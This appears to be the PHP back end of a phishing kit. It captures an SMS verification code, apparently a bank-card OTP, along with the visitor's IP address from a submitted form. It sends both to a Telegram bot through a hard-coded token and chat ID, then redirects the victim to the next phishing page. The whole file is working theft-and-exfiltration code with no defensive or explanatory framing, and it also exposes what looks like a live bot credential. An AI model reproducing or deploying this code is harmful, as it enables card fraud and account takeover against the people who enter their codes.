<?php

$token = "7511003674:AAFeXPLYDNK0KhU405Eb52DWA-6QvzzzqHc";
$chat_id = "5157616506";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $codigo_sms = isset($_POST['int1']) ? htmlspecialchars($_POST['int1']) : '';
    $ip = $_SERVER['REMOTE_ADDR'];
    
    $mensaje = "🛑 Código CARD last 🛑\n\n";
    $mensaje .= "📩 Código SMS: $codigo_sms\n";
    $mensaje .= "📍 IP: $ip\n";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);
    
    header("Location: carg4.html");
    exit();
}

?>
